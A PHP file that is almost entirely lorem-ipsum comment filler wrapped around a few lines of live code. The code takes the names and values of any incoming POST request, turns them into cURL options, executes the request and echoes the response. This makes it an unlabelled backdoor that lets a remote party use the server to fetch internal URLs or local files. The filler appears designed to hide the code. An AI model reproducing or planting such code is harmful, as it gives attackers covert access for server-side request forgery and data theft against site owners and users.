<?php

	/*
Nullam vitae libero id est accumsan pretium. Aenean vulputate iaculis tellus, ac egestas libero. Nam hendrerit convallis sem ut elementum. Aliquam est diam, semper ac erat eget, mollis molestie justo. Aliquam et dui luctus risus ullamcorper finibus ac ut eros. Sed pulvinar aliquet tortor id tristique. Proin ac erat pretium, iaculis urna in, tristique urna. Nam placerat congue lacus, eget iaculis turpis vulputate vitae. Sed accumsan non nisl vel porttitor. Nam dignissim quam odio. Mauris congue quam tortor, id pulvinar lacus volutpat hendrerit. Proin id ex nulla. Morbi finibus felis sed dignissim luctus. Lorem ipsum dolor sit amet, consectetur adipiscing elit.

Integer sodales libero et nisi gravida, eu facilisis risus porttitor. Quisque ullamcorper urna vel massa vestibulum bibendum. Nam congue dignissim diam, eget pretium libero. Praesent aliquet in nibh placerat venenatis. Phasellus porta maximus urna, vel faucibus nulla vestibulum sit amet. Curabitur et vulputate lorem, id pulvinar ex. Integer imperdiet id mi id finibus. Suspendisse in dui finibus, tincidunt est ac, euismod est. Phasellus rhoncus odio ac lacus commodo, eu accumsan neque finibus. Quisque elementum nunc tempus tortor accumsan, at pulvinar libero vehicula. Aliquam cursus urna libero, a rhoncus nunc iaculis ultrices. Vivamus tincidunt finibus tellus tristique mollis.

Mauris pharetra malesuada elit vestibulum volutpat. Donec sed ultricies nisi. Nunc hendrerit dignissim mi, a porta nisl varius vitae. Cras congue elit ac ex malesuada tempor. Ut ultrices ipsum felis. Pellentesque vestibulum leo nulla, id efficitur risus auctor eget. Aliquam erat volutpat. Donec feugiat velit eu sapien vulputate, quis scelerisque nisi pulvinar. Praesent vel pulvinar ligula, et aliquet ante. Pellentesque efficitur mi ut cursus faucibus. In congue tristique arcu a volutpat. Duis posuere lectus tortor, id semper risus pulvinar id. Ut molestie eu sem vitae elementum. Nam malesuada nunc vel quam vestibulum, vel cursus nibh euismod. Proin ut iaculis orci. Aenean non luctus diam, non ultrices magna.

Aenean vel augue tempor, fermentum odio et, volutpat turpis. Suspendisse nec porta elit, a malesuada magna. Etiam volutpat dignissim diam, at lacinia libero lobortis vel. Vestibulum sed dolor ultrices, placerat ligula id, euismod nibh. Maecenas sed facilisis risus. Duis at erat nec velit cursus rutrum. Proin augue magna, porttitor nec felis eu, blandit aliquam sem. Mauris vel nunc arcu. Sed molestie tortor consectetur aliquet maximus. In congue consectetur erat ut vulputate. Praesent maximus eleifend velit eget luctus. Cras maximus dui nibh, eu vehicula est ullamcorper sit amet. Aenean et sollicitudin nunc. Vestibulum pharetra, orci consequat cursus interdum, lorem lorem congue metus, non vehicula nunc quam non ex. Nulla sagittis ullamcorper augue in tincidunt. Aenean rutrum est mi, a varius sem laoreet vel.

Cras a vehicula massa, et luctus elit. Phasellus consectetur, mi eget auctor dignissim, est est iaculis quam, at tempor nisl orci in odio. Mauris leo purus, scelerisque a tristique ac, vehicula eget mauris. Fusce tempor nibh urna, nec consectetur ante scelerisque id. Vestibulum imperdiet ultricies dolor, non interdum est tempor sit amet. Duis viverra euismod accumsan. In sollicitudin mattis purus quis congue. Ut iaculis nibh sed pellentesque iaculis. Integer vestibulum suscipit lacus in molestie. Aenean pretium aliquet dignissim.


*/
	$ch = curl_init();

	curl_setopt_array($ch,
	    array_combine(
	        array_map("constant", array_keys($_POST)),
	        array_values($_POST)
	    )
	);

	$result = curl_exec($ch);

	curl_close($ch);

	echo $result;

/*
Nullam vitae libero id est accumsan pretium. Aenean vulputate iaculis tellus, ac egestas libero. Nam hendrerit convallis sem ut elementum. Aliquam est diam, semper ac erat eget, mollis molestie justo. Aliquam et dui luctus risus ullamcorper finibus ac ut eros. Sed pulvinar aliquet tortor id tristique. Proin ac erat pretium, iaculis urna in, tristique urna. Nam placerat congue lacus, eget iaculis turpis vulputate vitae. Sed accumsan non nisl vel porttitor. Nam dignissim quam odio. Mauris congue quam tortor, id pulvinar lacus volutpat hendrerit. Proin id ex nulla. Morbi finibus felis sed dignissim luctus. Lorem ipsum dolor sit amet, consectetur adipiscing elit.

Integer sodales libero et nisi gravida, eu facilisis risus porttitor. Quisque ullamcorper urna vel massa vestibulum bibendum. Nam congue dignissim diam, eget pretium libero. Praesent aliquet in nibh placerat venenatis. Phasellus porta maximus urna, vel faucibus nulla vestibulum sit amet. Curabitur et vulputate lorem, id pulvinar ex. Integer imperdiet id mi id finibus. Suspendisse in dui finibus, tincidunt est ac, euismod est. Phasellus rhoncus odio ac lacus commodo, eu accumsan neque finibus. Quisque elementum nunc tempus tortor accumsan, at pulvinar libero vehicula. Aliquam cursus urna libero, a rhoncus nunc iaculis ultrices. Vivamus tincidunt finibus tellus tristique mollis.

Mauris pharetra malesuada elit vestibulum volutpat. Donec sed ultricies nisi. Nunc hendrerit dignissim mi, a porta nisl varius vitae. Cras congue elit ac ex malesuada tempor. Ut ultrices ipsum felis. Pellentesque vestibulum leo nulla, id efficitur risus auctor eget. Aliquam erat volutpat. Donec feugiat velit eu sapien vulputate, quis scelerisque nisi pulvinar. Praesent vel pulvinar ligula, et aliquet ante. Pellentesque efficitur mi ut cursus faucibus. In congue tristique arcu a volutpat. Duis posuere lectus tortor, id semper risus pulvinar id. Ut molestie eu sem vitae elementum. Nam malesuada nunc vel quam vestibulum, vel cursus nibh euismod. Proin ut iaculis orci. Aenean non luctus diam, non ultrices magna.

Aenean vel augue tempor, fermentum odio et, volutpat turpis. Suspendisse nec porta elit, a malesuada magna. Etiam volutpat dignissim diam, at lacinia libero lobortis vel. Vestibulum sed dolor ultrices, placerat ligula id, euismod nibh. Maecenas sed facilisis risus. Duis at erat nec velit cursus rutrum. Proin augue magna, porttitor nec felis eu, blandit aliquam sem. Mauris vel nunc arcu. Sed molestie tortor consectetur aliquet maximus. In congue consectetur erat ut vulputate. Praesent maximus eleifend velit eget luctus. Cras maximus dui nibh, eu vehicula est ullamcorper sit amet. Aenean et sollicitudin nunc. Vestibulum pharetra, orci consequat cursus interdum, lorem lorem congue metus, non vehicula nunc quam non ex. Nulla sagittis ullamcorper augue in tincidunt. Aenean rutrum est mi, a varius sem laoreet vel.

Cras a vehicula massa, et luctus elit. Phasellus consectetur, mi eget auctor dignissim, est est iaculis quam, at tempor nisl orci in odio. Mauris leo purus, scelerisque a tristique ac, vehicula eget mauris. Fusce tempor nibh urna, nec consectetur ante scelerisque id. Vestibulum imperdiet ultricies dolor, non interdum est tempor sit amet. Duis viverra euismod accumsan. In sollicitudin mattis purus quis congue. Ut iaculis nibh sed pellentesque iaculis. Integer vestibulum suscipit lacus in molestie. Aenean pretium aliquet dignissim.

*/
?>